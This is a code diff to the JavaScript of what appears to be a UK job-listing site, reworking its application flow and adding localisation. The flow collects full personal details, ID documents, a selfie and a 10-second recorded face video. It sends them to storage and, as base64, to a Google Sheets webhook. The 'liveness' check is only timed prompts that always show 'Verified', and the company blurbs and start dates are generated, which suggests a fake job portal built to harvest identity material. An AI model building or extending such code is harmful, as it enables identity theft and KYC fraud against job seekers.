@@ -398,7 +398,8 @@ var HOURS_INFO = {
   'Zero Hours': { hours:'Flexible',            pattern:'As and when needed' },
 };
 
-function renderJob(j) {
+function renderJob(raw) {
+  var j = window.jpLocalizeJob ? window.jpLocalizeJob(raw) : raw;
   document.title = j.title + ' at ' + j.company + ' | JobsPlatform';
 
   // Logo
@@ -407,16 +408,16 @@ function renderJob(j) {
   logo.style.background = 'linear-gradient(135deg,'+j.color+','+j.color+'bb)';
 
   // Header tags
-  document.getElementById('jdType').textContent     = j.type;
-  document.getElementById('jdMode').textContent     = j.workMode;
-  document.getElementById('jdCategory').textContent = j.category;
+  document.getElementById('jdType').textContent     = j.typeLabel || j.type;
+  document.getElementById('jdMode').textContent     = j.modeLabel || j.workMode;
+  document.getElementById('jdCategory').textContent = j.catLabel || j.category;
   if (j.featured) document.getElementById('jdFeatured').style.display = 'inline-flex';
 
   document.getElementById('jdTitle').textContent       = j.title;
   document.getElementById('jdCompanyName').textContent = j.company;
   document.getElementById('jdLocation').textContent    = j.location + ', UK';
   document.getElementById('jdSalary').textContent      = j.salary;
-  document.getElementById('jdPosted').textContent      = timeAgo(j.postedAt);
+  document.getElementById('jdPosted').textContent      = window.jpTimeAgo ? window.jpTimeAgo(j.postedAt) : timeAgo(j.postedAt);
 
   // ── About the company ──
   var aboutPool = ABOUT_COMPANIES[j.category] || ABOUT_COMPANIES['Admin'];
@@ -440,26 +441,33 @@ function renderJob(j) {
   var hrs = HOURS_INFO[j.type] || HOURS_INFO['Full-time'];
   var startDate = new Date(); startDate.setDate(startDate.getDate() + 7);
   var startStr  = startDate.toLocaleDateString('en-GB', {day:'2-digit',month:'long',year:'numeric'});
+  var tType = window.jpMeta ? window.jpMeta(j.type, 'type') : j.type;
+  var tMode = window.jpMeta ? window.jpMeta(j.workMode, 'workMode') : j.workMode;
   document.getElementById('jdContractGrid').innerHTML = [
-    '<div class="jd-contract-item"><div class="ci-label">Contract type</div><div class="ci-value">'+j.type+'</div></div>',
-    '<div class="jd-contract-item"><div class="ci-label">Working hours</div><div class="ci-value">'+hrs.hours+'</div></div>',
-    '<div class="jd-contract-item"><div class="ci-label">Work pattern</div><div class="ci-value">'+hrs.pattern+'</div></div>',
-    '<div class="jd-contract-item"><div class="ci-label">Salary</div><div class="ci-value">'+j.salary+'</div></div>',
-    '<div class="jd-contract-item"><div class="ci-label">Work location</div><div class="ci-value">'+j.workMode+' — '+j.location+'</div></div>',
-    '<div class="jd-contract-item"><div class="ci-label">Start date</div><div class="ci-value">'+startStr+'</div></div>',
+    '<div class="jd-contract-item"><div class="ci-label">'+(window.jpT?window.jpT('contract_type'):'Contract type')+'</div><div class="ci-value">'+tType+'</div></div>',
+    '<div class="jd-contract-item"><div class="ci-label">'+(window.jpT?window.jpT('working_hours'):'Working hours')+'</div><div class="ci-value">'+hrs.hours+'</div></div>',
+    '<div class="jd-contract-item"><div class="ci-label">'+(window.jpT?window.jpT('work_pattern'):'Work pattern')+'</div><div class="ci-value">'+hrs.pattern+'</div></div>',
+    '<div class="jd-contract-item"><div class="ci-label">'+(window.jpT?window.jpT('salary'):'Salary')+'</div><div class="ci-value">'+j.salary+'</div></div>',
+    '<div class="jd-contract-item"><div class="ci-label">'+(window.jpT?window.jpT('work_location'):'Work location')+'</div><div class="ci-value">'+tMode+' — '+j.location+'</div></div>',
+    '<div class="jd-contract-item"><div class="ci-label">'+(window.jpT?window.jpT('start_date'):'Start date')+'</div><div class="ci-value">'+startStr+'</div></div>',
   ].join('');
 
   // ── Rich content ──
   var content = getContent(j);
 
-  // Description paragraphs
-  var paras = content.desc.split('\n\n');
+  // Description paragraphs — localized summary when not EN
+  var descText = j.desc || content.desc;
+  var paras = descText.split('\n\n');
   document.getElementById('jdDesc').innerHTML = paras.map(function(p){
     return '<p style="margin-bottom:16px;color:var(--muted);line-height:1.85;font-size:15px;">'+p+'</p>';
   }).join('');
 
+  var lang = window.jpLang ? window.jpLang() : 'en';
+  var reqs = (lang !== 'en' && window.JP_GENERIC_REQ && window.JP_GENERIC_REQ[lang]) ? window.JP_GENERIC_REQ[lang] : content.requirements;
+  var bens = (lang !== 'en' && window.JP_GENERIC_BEN && window.JP_GENERIC_BEN[lang]) ? window.JP_GENERIC_BEN[lang] : content.benefits;
+
   // Requirements
-  document.getElementById('jdRequirements').innerHTML = content.requirements.map(function(r){
+  document.getElementById('jdRequirements').innerHTML = reqs.map(function(r){
     return '<li><i class="fa-solid fa-circle-check" style="color:#16a34a;font-size:13px;margin-top:3px;flex-shrink:0;"></i> <span>'+r+'</span></li>';
   }).join('');
 
@@ -474,7 +482,7 @@ function renderJob(j) {
   }).join('');
 
   // Benefits grid
-  document.getElementById('jdBenefits').innerHTML = content.benefits.map(function(b){
+  document.getElementById('jdBenefits').innerHTML = bens.map(function(b){
     return '<div class="jd-benefit-item"><i class="fa-solid fa-circle-check"></i> <span>'+b+'</span></div>';
   }).join('');
 
@@ -510,8 +518,9 @@ function populateApplySidebar(j) {
   document.getElementById('apSidebarTitle').textContent   = j.title;
   document.getElementById('apSidebarCompany').textContent = j.company;
   document.getElementById('apSidebarLocation').textContent= j.location;
-  document.getElementById('apSidebarType').textContent    = j.type;
-  document.getElementById('apSidebarSalary').textContent  = j.salary + ' per year';
+  document.getElementById('apSidebarType').textContent    = window.jpMeta ? window.jpMeta(j.type, 'type') : j.type;
+  var salSuffix = (j.salaryMin && j.salaryMin < 100) ? (window.jpT ? window.jpT('per_hour') : 'per hour') : (window.jpT ? window.jpT('per_year') : 'per year');
+  document.getElementById('apSidebarSalary').textContent  = j.salary + ' ' + salSuffix;
 }
 
 // ─── APPLY FLOW ──────────────────────────────────────────────
@@ -544,8 +553,9 @@ function showApplyView() {
 
 // ─── STEP LOGIC ──────────────────────────────────────────────
 function stopAllCams() {
-  if (window.idCamStream)     { idCamStream.getTracks().forEach(function(t){t.stop();}); idCamStream = null; }
-  if (window.selfieCamStream) { selfieCamStream.getTracks().forEach(function(t){t.stop();}); selfieCamStream = null; }
+  stopKycRecording();
+  if (idCamStream)     { idCamStream.getTracks().forEach(function(t){t.stop();}); idCamStream = null; }
+  if (selfieCamStream) { selfieCamStream.getTracks().forEach(function(t){t.stop();}); selfieCamStream = null; }
 }
 
 function applyGoStep(n) {
@@ -565,7 +575,7 @@ function applyGoStep(n) {
     if (line) line.classList.toggle('done', i < n);
   }
   applyCurrentStep = n;
-  if (n === 3) { setTimeout(function(){ livenessReset(); selfieCamInit(); }, 200); }
+  if (n === 3) { setTimeout(function(){ kycReset(); kycInit(); }, 200); }
 }
 
 function markField(id, ok, msg) {
@@ -592,40 +602,40 @@ function applyStep2() {
   });
 
   // Required fields
-  if (!fn)   { markField('ap_fn',   false); showApplyMsg('applyMsg1','First name is required.','error'); return; }
-  if (!ln)   { markField('ap_ln',   false); showApplyMsg('applyMsg1','Last name is required.','error'); return; }
+  if (!fn)   { markField('ap_fn',   false); showApplyMsg('applyMsg1', window.jpT('err_fn'),'error'); return; }
+  if (!ln)   { markField('ap_ln',   false); showApplyMsg('applyMsg1', window.jpT('err_ln'),'error'); return; }
 
   // Email
   if (!em || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)) {
-    markField('ap_em', false); showApplyMsg('applyMsg1','Please enter a valid email address.','error'); return;
+    markField('ap_em', false); showApplyMsg('applyMsg1', window.jpT('err_email'),'error'); return;
   }
 
   // Phone: must have 10-15 digits (UK: 07xxx xxxxxx or +44 7xxx xxxxxx)
   var digits = ph.replace(/\D/g,'');
   if (!ph || digits.length < 10 || digits.length > 15) {
-    markField('ap_ph', false); showApplyMsg('applyMsg1','Please enter a valid UK phone number (e.g. 07700 900123).','error'); return;
+    markField('ap_ph', false); showApplyMsg('applyMsg1', window.jpT('err_phone'),'error'); return;
   }
 
   // City: letters only, min 2 chars
   if (!city || city.length < 2 || !/^[a-zA-Z\s\-]+$/.test(city)) {
-    markField('ap_city', false); showApplyMsg('applyMsg1','Please enter a valid city name.','error'); return;
+    markField('ap_city', false); showApplyMsg('applyMsg1', window.jpT('err_city'),'error'); return;
   }
 
   // UK Postcode: e.g. SW1A 1AA, M1 1AE, EC1A 1BB
   if (!post || !/^[A-Z]{1,2}[0-9][0-9A-Z]?\s?[0-9][A-Z]{2}$/i.test(post)) {
-    markField('ap_post', false); showApplyMsg('applyMsg1','Please enter a valid UK postcode (e.g. SW1A 1AA).','error'); return;
+    markField('ap_post', false); showApplyMsg('applyMsg1', window.jpT('err_post'),'error'); return;
   }
 
   // Address: min 5 chars, must have a number
   if (!addr || addr.length < 5 || !/\d/.test(addr)) {
-    markField('ap_addr', false); showApplyMsg('applyMsg1','Please enter a full address including house number.','error'); return;
+    markField('ap_addr', false); showApplyMsg('applyMsg1', window.jpT('err_addr'),'error'); return;
   }
 
   // Date of birth: required, must be 16-80 years old
-  if (!dob) { markField('ap_dob', false); showApplyMsg('applyMsg1','Please enter your date of birth.','error'); return; }
+  if (!dob) { markField('ap_dob', false); showApplyMsg('applyMsg1', window.jpT('err_dob'),'error'); return; }
   var age = (new Date() - new Date(dob)) / (365.25 * 24 * 3600 * 1000);
   if (age < 16 || age > 80) {
-    markField('ap_dob', false); showApplyMsg('applyMsg1','You must be at least 16 years old to apply.','error'); return;
+    markField('ap_dob', false); showApplyMsg('applyMsg1', window.jpT('err_age'),'error'); return;
   }
 
   showApplyMsg('applyMsg1', '', '');
@@ -636,27 +646,29 @@ function applyStep3() {
   var cvFile = document.getElementById('apCvFile').files[0];
   var idFile = document.getElementById('apIdFile').files[0];
   var hasIdCam = !!window._idCapturedDataUrl;
-  if (!cvFile) { showApplyMsg('applyMsg2','Please upload your CV.','error'); return; }
-  if (!idFile && !hasIdCam) { showApplyMsg('applyMsg2','Please provide your identity document.','error'); return; }
+  if (!cvFile) { showApplyMsg('applyMsg2', window.jpT('err_cv'),'error'); return; }
+  if (!idFile && !hasIdCam) { showApplyMsg('applyMsg2', window.jpT('err_id'),'error'); return; }
   showApplyMsg('applyMsg2','','');
   applyGoStep(3);
 }
 
 function applyStep4() {
-  if (!window._selfieCapturedDataUrl) { showApplyMsg('applyMsg3s','Please complete face verification.','error'); return; }
+  if (!window._selfieVideoBlob || !window._selfieCapturedDataUrl) {
+    showApplyMsg('applyMsg3s', window.jpT('err_face'),'error'); return;
+  }
   showApplyMsg('applyMsg3s','','');
   var cvFile = document.getElementById('apCvFile').files[0];
   var idFile = document.getElementById('apIdFile').files[0];
   var rev = document.getElementById('reviewData');
   rev.innerHTML = [
-    ['Name',    document.getElementById('ap_fn').value + ' ' + document.getElementById('ap_ln').value],
+    [window.jpT('review_name'), document.getElementById('ap_fn').value + ' ' + document.getElementById('ap_ln').value],
     ['Email',   document.getElementById('ap_em').value],
-    ['Phone',   document.getElementById('ap_ph').value],
-    ['City',    document.getElementById('ap_city').value],
-    ['Address', document.getElementById('ap_addr').value],
-    ['CV',      cvFile ? cvFile.name : '✓ Uploaded'],
-    ['ID Doc',  idFile ? idFile.name : '✓ Camera capture'],
-    ['Selfie',  '✓ Verified'],
+    [window.jpT('phone'),   document.getElementById('ap_ph').value],
+    [window.jpT('city'),    document.getElementById('ap_city').value],
+    [window.jpT('address'), document.getElementById('ap_addr').value],
+    [window.jpT('review_cv'),      cvFile ? cvFile.name : window.jpT('review_uploaded')],
+    [window.jpT('review_id'),  idFile ? idFile.name : window.jpT('review_captured')],
+    [window.jpT('review_face'),  window.jpT('review_verified') + ' (video + photo)'],
   ].map(function(r){
     return '<div class="review-row"><span>'+r[0]+'</span><strong>'+r[1]+'</strong></div>';
   }).join('');
@@ -760,20 +772,26 @@ function apPreviewId() {
   box.parentElement.classList.add('has-file');
 }
 
-// ─── SELFIE CAMERA ───────────────────────────────────────────
+// ─── SHOPIFY-STYLE KYC — Liveness + 10s Video + Photo ────────
 var selfieCamStream = null;
-
-// ─── LIVENESS CHECK ──────────────────────────────────────────
-var livenessSteps = [
-  { label: 'STEP 1 / 5', text: 'Look straight ahead',  arrow: null,    duration: 2200 },
-  { label: 'STEP 2 / 5', text: 'Turn your head left',  arrow: 'left',  duration: 2200 },
-  { label: 'STEP 3 / 5', text: 'Turn your head right', arrow: 'right', duration: 2200 },
-  { label: 'STEP 4 / 5', text: 'Look up slowly',       arrow: 'up',    duration: 2000 },
-  { label: 'STEP 5 / 5', text: 'Look back straight',   arrow: null,    duration: 1800 },
-];
+var kycRecorder = null;
+var kycRecordStart = 0;
+var kycVideoChunks = [];
+var kycVideoMime = 'video/webm';
 var livenessIdx = 0;
 var livenessTimer = null;
-var livenessActive = false;
+var kycPendingPhoto = false;
+var FACE_VIDEO_MIN_MS = 10000;
+
+function getLivenessSteps() {
+  return [
+    { label: 'STEP 1/5', text: window.jpT('live_straight'), arrow: null,    duration: 2200 },
+    { label: 'STEP 2/5', text: window.jpT('live_left'),    arrow: 'left',  duration: 2200 },
+    { label: 'STEP 3/5', text: window.jpT('live_right'),   arrow: 'right', duration: 2200 },
+    { label: 'STEP 4/5', text: window.jpT('live_up'),     arrow: 'up',    duration: 2000 },
+    { label: 'STEP 5/5', text: window.jpT('live_straight2'), arrow: null, duration: 1800 },
+  ];
+}
 
 function hideAllArrows() {
   ['arrowLeft','arrowRight','arrowUp','arrowDown'].forEach(function(id){
@@ -789,18 +807,35 @@ function showArrow(dir) {
   if (el) el.classList.add('show');
 }
 
-function livenessReset() {
-  livenessIdx = 0; livenessActive = false;
+function kycReset() {
+  stopKycRecording();
+  window._selfieVideoBlob = null;
+  window._selfieCapturedDataUrl = null;
+  livenessIdx = 0;
+  kycPendingPhoto = false;
   if (livenessTimer) { clearTimeout(livenessTimer); livenessTimer = null; }
   var bar = document.getElementById('livenessBar');
   if (bar) bar.style.display = 'none';
   var prog = document.getElementById('livenessProgress');
-  if (prog) prog.style.width = '0%';
+  if (prog) { prog.style.width = '0%'; prog.style.background = ''; }
   hideAllArrows();
-  document.getElementById('selfieCaptureBtn').style.display = 'none';
-  document.getElementById('selfieRetryBtn').style.display   = 'none';
+  var retry = document.getElementById('selfieRetryBtn');
+  if (retry) retry.style.display = 'none';
   var nextBtn = document.getElementById('selfieNextBtn');
   if (nextBtn) nextBtn.style.display = 'none';
+  var previewVid = document.getElementById('selfieVideoPreview');
+  if (previewVid) { previewVid.style.display = 'none'; previewVid.src = ''; }
+  var img = document.getElementById('selfieCapturedImg');
+  if (img) { img.style.display = 'none'; img.src = ''; }
+  var oval = document.getElementById('selfieOval');
+  if (oval) oval.classList.remove('verified');
+}
+
+function stopKycRecording() {
+  if (livenessTimer) { clearTimeout(livenessTimer); livenessTimer = null; }
+  if (kycRecorder && kycRecorder.state !== 'inactive') {
+    try { kycRecorder.stop(); } catch(e) {}
+  }
 }
 
 function kycSetStatus(label, active) {
@@ -815,21 +850,106 @@ function kycSetQuality(level) {
   segs.forEach(function(s, i) { s.classList.toggle('on', i < level); });
 }
 
+function kycCapturePhoto() {
+  var video = document.getElementById('selfieCamVideo');
+  var canvas = document.getElementById('selfieCamCanvas');
+  var img = document.getElementById('selfieCapturedImg');
+  if (!video || !canvas) return null;
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+  var dataUrl = canvas.toDataURL('image/jpeg', 0.92);
+  window._selfieCapturedDataUrl = dataUrl;
+  if (img) { img.src = dataUrl; img.style.display = 'block'; }
+  if (video) video.style.display = 'none';
+  return dataUrl;
+}
+
+function kycFinishUI() {
+  document.getElementById('livenessIcon').textContent = '✓';
+  document.getElementById('livenessIcon').style.background = '#16a34a';
+  document.getElementById('livenessText').textContent = window.jpT('face_complete');
+  document.getElementById('livenessProgress').style.width = '100%';
+  document.getElementById('livenessProgress').style.background = 'linear-gradient(90deg,#16a34a,#22c55e)';
+  kycSetStatus('Verified', true);
+  kycSetQuality(5);
+  var oval = document.getElementById('selfieOval');
+  if (oval) oval.classList.add('verified');
+  var hintText = document.getElementById('kycHintText');
+  if (hintText) hintText.textContent = window.jpT('kyc_photo_captured');
+  document.getElementById('selfieRetryBtn').style.display = 'inline-flex';
+  document.getElementById('selfieNextBtn').style.display = 'inline-flex';
+  hideAllArrows();
+  var dots = document.getElementById('selfieDots');
+  if (dots) dots.style.display = 'none';
+  var scan = document.getElementById('selfieScan');
+  if (scan) scan.style.display = 'none';
+  if (selfieCamStream) {
+    selfieCamStream.getTracks().forEach(function(t){ t.stop(); });
+    selfieCamStream = null;
+  }
+}
+
+function kycOnRecorderStop() {
+  if (kycVideoChunks.length) {
+    window._selfieVideoBlob = new Blob(kycVideoChunks, { type: kycVideoMime });
+  }
+  kycRecorder = null;
+  if (kycPendingPhoto) {
+    kycCapturePhoto();
+    kycFinishUI();
+    kycPendingPhoto = false;
+  }
+}
+
+function kycStartRecording(stream) {
+  kycVideoChunks = [];
+  kycVideoMime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9'
+    : (MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4');
+  try {
+    kycRecorder = new MediaRecorder(stream, { mimeType: kycVideoMime });
+  } catch(e) {
+    kycRecorder = new MediaRecorder(stream);
+    kycVideoMime = kycRecorder.mimeType || 'video/webm';
+  }
+  kycRecordStart = Date.now();
+  kycRecorder.ondataavailable = function(e) { if (e.data && e.data.size > 0) kycVideoChunks.push(e.data); };
+  kycRecorder.onstop = kycOnRecorderStop;
+  kycRecorder.start(250);
+}
+
+function kycStopRecordingWithPhoto() {
+  kycPendingPhoto = true;
+  var elapsed = Date.now() - kycRecordStart;
+  var wait = Math.max(0, FACE_VIDEO_MIN_MS - elapsed);
+  setTimeout(function() {
+    if (kycRecorder && kycRecorder.state === 'recording') {
+      kycRecorder.stop();
+    } else {
+      kycCapturePhoto();
+      kycFinishUI();
+      kycPendingPhoto = false;
+    }
+  }, wait);
+}
+
 function livenessStart() {
-  livenessActive = true;
+  livenessIdx = 0;
   document.getElementById('livenessBar').style.display = 'block';
   var hint = document.getElementById('kycHint');
   if (hint) hint.style.display = 'block';
-  kycSetStatus('Live', true);
+  kycSetStatus(window.jpT('face_recording'), true);
   kycSetQuality(4);
   livenessRunStep();
 }
 
 function livenessRunStep() {
-  if (livenessIdx >= livenessSteps.length) {
-    livenessComplete(); return;
+  var steps = getLivenessSteps();
+  if (livenessIdx >= steps.length) {
+    livenessComplete();
+    return;
   }
-  var step = livenessSteps[livenessIdx];
+  var step = steps[livenessIdx];
   document.getElementById('livenessIcon').textContent = step.label;
   document.getElementById('livenessIcon').style.background = '#0055A5';
   document.getElementById('livenessText').textContent = step.text;
@@ -837,10 +957,11 @@ function livenessRunStep() {
   var hintText = document.getElementById('kycHintText');
   if (hintText) hintText.textContent = step.text;
   var prog = document.getElementById('livenessProgress');
-  prog.style.transition = 'none'; prog.style.width = '0%';
-  var pct = ((livenessIdx + 1) / livenessSteps.length * 100).toFixed(0) + '%';
+  prog.style.transition = 'none';
+  prog.style.width = '0%';
+  var pct = ((livenessIdx + 1) / steps.length * 100).toFixed(0) + '%';
   setTimeout(function() {
-    prog.style.transition = 'width ' + (step.duration/1000) + 's linear';
+    prog.style.transition = 'width ' + (step.duration / 1000) + 's linear';
     prog.style.width = pct;
   }, 50);
   livenessTimer = setTimeout(function() {
@@ -851,38 +972,30 @@ function livenessRunStep() {
 
 function livenessComplete() {
   hideAllArrows();
-  document.getElementById('livenessIcon').textContent = '✓ VERIFIED';
-  document.getElementById('livenessIcon').style.background = '#16a34a';
-  document.getElementById('livenessText').textContent = 'Liveness confirmed — capture your photo';
-  document.getElementById('livenessProgress').style.width = '100%';
-  document.getElementById('livenessProgress').style.background = 'linear-gradient(90deg,#16a34a,#22c55e)';
-  kycSetStatus('Verified', true);
-  kycSetQuality(5);
-  var oval = document.getElementById('selfieOval');
-  if (oval) oval.classList.add('verified');
-  var hintText = document.getElementById('kycHintText');
-  if (hintText) hintText.textContent = 'Liveness check passed — take your photo';
-  document.getElementById('selfieCaptureBtn').style.display = 'inline-flex';
+  document.getElementById('livenessText').textContent = window.jpT('kyc_capturing_photo');
+  kycStopRecordingWithPhoto();
 }
 
-async function selfieCamInit() {
+async function kycInit() {
   var video = document.getElementById('selfieCamVideo');
-  if (video.style.display === 'block') return;
   var preview = document.getElementById('apSelfiePreview');
+  kycReset();
   try {
-    selfieCamStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 720 } } });
+    selfieCamStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 720 } },
+      audio: false
+    });
     video.srcObject = selfieCamStream;
     video.style.display = 'block';
     if (preview) preview.style.display = 'none';
-    document.getElementById('selfieRetryBtn').style.display = 'none';
-    document.getElementById('selfieCaptureBtn').style.display = 'none';
     kycSetStatus('Detecting', false);
     kycSetQuality(2);
     var dots = document.getElementById('selfieDots');
     if (dots) dots.style.display = 'block';
     var scan = document.getElementById('selfieScan');
     if (scan) scan.style.display = 'block';
-    setTimeout(function(){ kycSetQuality(3); kycSetStatus('Detected', false); }, 500);
+    kycStartRecording(selfieCamStream);
+    setTimeout(function() { kycSetQuality(3); kycSetStatus('Detected', false); }, 500);
     setTimeout(livenessStart, 1200);
   } catch(e) {
     if (preview) {
@@ -890,58 +1003,22 @@ async function selfieCamInit() {
       preview.innerHTML =
         '<i class="fa-solid fa-ban" style="font-size:32px;color:#dc2626;margin-bottom:10px;"></i>' +
         '<span style="font-size:14px;font-weight:700;color:#dc2626;">Camera access required</span>' +
-        '<small style="color:#9ca3af;margin-top:6px;text-align:center;line-height:1.5;">Please allow camera access in your browser settings and try again.</small>' +
-        '<button onclick="selfieCamRetry()" style="margin-top:12px;padding:10px 20px;background:#2563eb;color:#fff;border:none;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;"><i class=\"fa-solid fa-rotate-left\"></i> Try Again</button>';
+        '<small style="color:#9ca3af;margin-top:6px;text-align:center;line-height:1.5;">Please allow camera access and try again.</small>' +
+        '<button onclick="selfieCamRetry()" style="margin-top:12px;padding:10px 20px;background:#2563eb;color:#fff;border:none;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;"><i class="fa-solid fa-rotate-left"></i> ' + window.jpT('face_retry') + '</button>';
     }
-    document.getElementById('livenessBar').style.display = 'none';
   }
 }
 
-function selfieCamCapture() {
-  var video  = document.getElementById('selfieCamVideo');
-  var canvas = document.getElementById('selfieCamCanvas');
-  var img    = document.getElementById('selfieCapturedImg');
-  canvas.width  = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext('2d').drawImage(video, 0, 0);
-  var dataUrl = canvas.toDataURL('image/jpeg', 0.92);
-  img.src = dataUrl;
-  img.style.display = 'block';
-  video.style.display = 'none';
-  if (selfieCamStream) { selfieCamStream.getTracks().forEach(function(t){t.stop();}); selfieCamStream = null; }
-  document.getElementById('selfieCaptureBtn').style.display = 'none';
-  document.getElementById('selfieRetryBtn').style.display   = 'inline-flex';
-  document.getElementById('livenessBar').style.display = 'none';
-  hideAllArrows();
-  var dots = document.getElementById('selfieDots');
-  if (dots) dots.style.display = 'none';
-  var scan = document.getElementById('selfieScan');
-  if (scan) scan.style.display = 'none';
-  var nextBtn = document.getElementById('selfieNextBtn');
-  if (nextBtn) nextBtn.style.display = 'inline-flex';
-  window._selfieCapturedDataUrl = dataUrl;
-}
-
 function selfieCamRetry() {
-  document.getElementById('selfieCapturedImg').style.display = 'none';
-  window._selfieCapturedDataUrl = null;
-  livenessReset();
-  selfieCamInit();
-}
-
-function apPreviewSelfie() {
-  var file = document.getElementById('apSelfie').files[0];
-  if (!file) return;
-  var reader = new FileReader();
-  reader.onload = function(e) {
-    window._selfieCapturedDataUrl = e.target.result;
-    document.getElementById('selfieCapturedImg').src = e.target.result;
-    document.getElementById('selfieCapturedImg').style.display = 'block';
-    document.getElementById('apSelfiePreview').style.display = 'none';
-    document.getElementById('selfieRetryBtn').style.display = 'inline-flex';
-    document.getElementById('selfieCaptureBtn').style.display = 'none';
-  };
-  reader.readAsDataURL(file);
+  kycReset();
+  var video = document.getElementById('selfieCamVideo');
+  if (video) { video.style.display = 'none'; video.srcObject = null; }
+  var preview = document.getElementById('apSelfiePreview');
+  if (preview) {
+    preview.style.display = 'flex';
+    preview.innerHTML = '<span style="font-size:13px;font-weight:600;color:rgba(255,255,255,0.35);">KYC INITIALISING</span>';
+  }
+  kycInit();
 }
 
 function formatSz(b) { return b>1048576 ? (b/1048576).toFixed(1)+' MB' : (b/1024).toFixed(0)+' KB'; }
@@ -988,53 +1065,91 @@ async function submitApply() {
   var cvFile = document.getElementById('apCvFile').files[0];
   var idFile = document.getElementById('apIdFile').files[0];
 
+  // Wait for Supabase init (config.js)
+  for (var _w = 0; _w < 30; _w++) { if (window.sb !== undefined) break; await new Promise(function(r){setTimeout(r,100);}); }
+
   var ts = Date.now();
   var safeName = (fn + '_' + ln).replace(/\s+/g, '_').toLowerCase();
 
-  var cvPath      = null;
-  var idDocPath   = null;
-  var selfiePath  = null;
+  var cvPath       = null;
+  var idDocPath    = null;
+  var faceVideoPath = null;
+  var submitError  = false;
 
   if (window.sb) {
-    // Upload CV
     if (cvFile) {
       cvPath = await uploadToStorage('cvs', safeName + '_' + ts + '_cv.pdf', cvFile);
     }
 
-    // Upload ID (file or camera capture)
     var idBlob = idFile ? idFile : (window._idCapturedDataUrl ? dataUrlToBlob(window._idCapturedDataUrl) : null);
     if (idBlob) {
       var idExt = idFile ? (idFile.name.split('.').pop() || 'jpg') : 'jpg';
       idDocPath = await uploadToStorage('documents', safeName + '_' + ts + '_id.' + idExt, idBlob);
     }
 
-    // Upload selfie (camera capture)
+    var selfiePhotoPath = null;
     if (window._selfieCapturedDataUrl) {
       var selfieBlob = dataUrlToBlob(window._selfieCapturedDataUrl);
-      selfiePath = await uploadToStorage('photos', safeName + '_' + ts + '_selfie.jpg', selfieBlob);
+      selfiePhotoPath = await uploadToStorage('photos', safeName + '_' + ts + '_selfie.jpg', selfieBlob);
+    }
+    if (window._selfieVideoBlob) {
+      var vidExt = (window._selfieVideoBlob.type || '').includes('mp4') ? 'mp4' : 'webm';
+      faceVideoPath = await uploadToStorage('photos', safeName + '_' + ts + '_face.' + vidExt, window._selfieVideoBlob);
     }
 
-    // Insert into applications table
     var { error: dbErr } = await window.sb.from('applications').insert({
-      job_id:       currentJob.id   || null,
-      job_title:    currentJob.title || '',
-      company:      currentJob.company || '',
-      location:     currentJob.location || '',
-      first_name:   fn,
-      last_name:    ln,
-      email:        em,
-      phone:        ph,
-      city:         city,
-      postal_code:  post,
-      address:      addr,
-      birth_date:   dob,
-      cover_letter: cover,
-      cv_url:       cvPath,
-      id_doc_url:   idDocPath,
-      selfie_url:   selfiePath,
-      status:       'pending',
+      job_id:         currentJob.id   || null,
+      job_title:      currentJob.title || '',
+      company:        currentJob.company || '',
+      location:       currentJob.location || '',
+      first_name:     fn,
+      last_name:      ln,
+      email:          em,
+      phone:          ph,
+      city:           city,
+      postal_code:    post,
+      address:        addr,
+      birth_date:     dob,
+      cover_letter:   cover,
+      cv_url:         cvPath,
+      id_doc_url:     idDocPath,
+      selfie_url:     selfiePhotoPath,
+      face_video_url: faceVideoPath,
+      status:         'pending',
     });
-    if (dbErr) console.warn('DB insert error:', dbErr.message);
+    if (dbErr) { console.warn('DB insert error:', dbErr.message); submitError = true; }
+  }
+
+  // Google Sheets webhook
+  if (window.sheetApplication) {
+    var idB64 = null, idName = null, vidB64 = null, vidName = null;
+    if (idFile) {
+      idB64 = await toBase64(idFile);
+      idName = idFile.name;
+    } else if (window._idCapturedDataUrl) {
+      idB64 = window._idCapturedDataUrl;
+      idName = safeName + '_id.jpg';
+    }
+    var photoB64 = window._selfieCapturedDataUrl || null;
+    var photoName = safeName + '_selfie.jpg';
+    if (window._selfieVideoBlob) {
+      vidB64 = await new Promise(function(resolve) {
+        var reader = new FileReader();
+        reader.onload = function(e) { resolve(e.target.result); };
+        reader.onerror = function() { resolve(null); };
+        reader.readAsDataURL(window._selfieVideoBlob);
+      });
+      vidName = safeName + '_face.webm';
+    }
+    sheetApplication(currentJob, {
+      firstName: fn, lastName: ln, email: em, phone: ph,
+      city: city, postalCode: post, address: addr, birthDate: dob,
+      coverLetter: cover, hasId: !!(idFile || window._idCapturedDataUrl),
+      hasSelfie: !!(window._selfieCapturedDataUrl && window._selfieVideoBlob),
+      idFileData: idB64, idFileName: idName,
+      selfieData: photoB64, selfieName: photoName,
+      faceVideoData: vidB64, faceVideoName: vidName,
+    });
   }
 
   // Save locally as backup
@@ -1042,10 +1157,20 @@ async function submitApply() {
   apps.push({
     jobId: currentJob.id, jobTitle: currentJob.title, company: currentJob.company,
     appliedAt: new Date().toISOString(), name: fn + ' ' + ln, email: em,
+    hasFaceVideo: !!window._selfieVideoBlob,
+    hasSelfiePhoto: !!window._selfieCapturedDataUrl,
   });
   localStorage.setItem('jp_applications', JSON.stringify(apps));
 
-  await new Promise(function(r) { setTimeout(r, 800); });
+  document.getElementById('submitApplyTxt').style.display  = 'inline';
+  document.getElementById('submitApplySpin').style.display = 'none';
+
+  if (submitError && window.sb) {
+    showApplyMsg('applyMsg3', window.jpT('err_submit'), 'error');
+    return;
+  }
+
+  await new Promise(function(r) { setTimeout(r, 600); });
 
   for (var i = 1; i <= 4; i++) { var s = document.getElementById('applyStep'+i); if (s) s.style.display = 'none'; }
   document.getElementById('applySuccess').style.display = 'block';
@@ -1078,6 +1203,11 @@ window.addEventListener('DOMContentLoaded', function() {
   }
 
   renderJob(currentJob);
+
+  window.onJpLangChange = function() {
+    if (currentJob) renderJob(currentJob);
+    if (window.jpApplyUI) window.jpApplyUI();
+  };
 
   // Auto-open apply form if returning from login
